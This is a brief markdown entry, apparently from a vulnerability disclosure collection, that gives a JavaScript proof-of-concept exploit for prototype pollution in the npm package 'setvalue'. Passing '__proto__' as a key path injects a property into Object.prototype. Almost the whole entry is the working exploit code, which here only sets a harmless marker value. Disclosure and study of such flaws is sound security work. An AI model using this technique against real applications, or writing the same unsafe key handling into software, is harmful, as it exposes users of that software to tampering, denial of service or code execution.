# setvalue

- package name: `setvalue`

- PoC exploit:

```javascript
var setvalue = require('setvalue');
setvalue.set('__proto__', 'polluted')({}, 'yes');

// Object.prototype.polluted === 'yes'
```